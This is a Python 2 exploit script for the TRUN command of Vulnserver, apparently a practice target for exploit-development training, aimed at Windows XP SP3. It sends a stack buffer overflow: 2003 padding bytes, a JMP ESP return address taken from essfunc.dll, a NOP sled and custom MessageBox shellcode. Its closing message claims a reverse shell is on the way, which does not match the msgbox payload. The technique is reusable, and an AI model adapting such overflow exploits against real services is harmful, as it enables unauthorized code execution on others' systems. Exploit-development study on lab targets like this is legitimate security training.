# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Steve Bradshaw's Vulnserver TRUN - with custom msgbox shellcode
# Windows XP SP3
# 21/03/2018

import sys
import struct
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 9999

try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

# Grab the banner
banner = sock.recv(1024)
print "Connected to ", host
print banner

# msgbox ub3rsick - 00 20
# no encoding
shell = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x33\x59\x88\x51\x0a\xbb\x7b\x1d\x80\x7c"
	"\x51\xff\xd3\xeb\x35\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\x30\xae\x80\x7c\xff"
	"\xd3\xeb\x35\x59\x31\xd2\x88\x51\x08\x52\x51\x51\x52\xff\xd0\x52\xb8\xfa\xca"
	"\x81\x7c\xff\xd0\xe8\xc8\xff\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c"
	"\x4e\xe8\xc6\xff\xff\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8"
	"\xc6\xff\xff\xff\x55\x42\x33\x52\x53\x69\x43\x4b\x4e")

payload = "TRUN /.:/"

# EIP Overwrite at 2003
payload += "A"*2003

# essfunc.dll
# 625011AF
ret = 0x625011AF

payload += p(ret)

# Sits on stack and ESP points directly to the beginning of this chunk
#payload += "C"*300
payload += "\x90"*16 + shell

print "Sending UB3R Payl0ad :D"
sock.send(payload)
print "One Reverse Shell Coming Right Up..."
"""
while True:
	inp = raw_input()
	sock.send(str(inp))
	dat = sock.recv(1024)
	print dat
"""
